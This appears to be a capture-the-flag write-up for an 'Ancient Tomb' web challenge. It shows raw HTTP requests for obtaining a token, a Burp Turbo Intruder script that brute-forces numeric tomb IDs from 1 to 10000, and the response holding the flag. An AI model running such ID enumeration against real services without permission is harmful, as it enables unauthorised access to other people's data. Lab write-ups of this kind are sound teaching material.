Trapped! Trapped in a large tomb with thousands of coffins we need to find a way out. Surely the answer must lie in one of these coffins. Locked! It appears we need to find a key first.

(Bruteforceing allowed, but keep the number of requests/seconds low.)

![](Ancient_Tomb_App_Click_Tomb.png)


```http
// Function to get a new token from the API
    function getNewToken() {
        fetch('/api/token', {
            method: 'POST',
        })
        .then(response => response.json())
        .then(data => {
            if (data.token) {
                currentToken = data.token;
                tokenInput.value = currentToken;
                localStorage.setItem('tombToken', currentToken);
                showResponse({ message: 'New token received', token: currentToken });
            } else {
                showResponse({ error: 'Failed to get token', details: data });
            }
        })
        .catch(error => {
            showResponse({ error: 'Failed to get token', details: error.message });
        });
    }
```

```http
POST /api/token HTTP/1.1
Host: 134.122.88.8:5002
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: */*
Referer: http://134.122.88.8:5002/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.9.21
Date: Fri, 02 May 2025 13:50:43 GMT
Content-Type: application/json
Content-Length: 26
Connection: close

{"token":"key-174619384"}
```

Using Turbo Intruder in BurpSuite:
```http
GET /api/tomb/%s?token=key-174619384 HTTP/1.1
Host: 134.122.88.8:5002
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: */*
Referer: http://134.122.88.8:5002/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
With
```python

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.THREADED
                           )

    for x in range(1, 10001):
        engine.queue(target.req, x)


def handleResponse(req, interesting):
    print(req)
    table.add(req)
```


```http
GET /api/tomb/3367?token=key-174619384 HTTP/1.1
Host: 134.122.88.8:5002
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: */*
Referer: http://134.122.88.8:5002/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.9.21
Date: Fri, 02 May 2025 13:51:59 GMT
Content-Type: application/json
Content-Length: 61
Connection: close

{"content":"flag O24{Lar4_w0Uld_b3_PRouD!}","tombId":"3367"}
```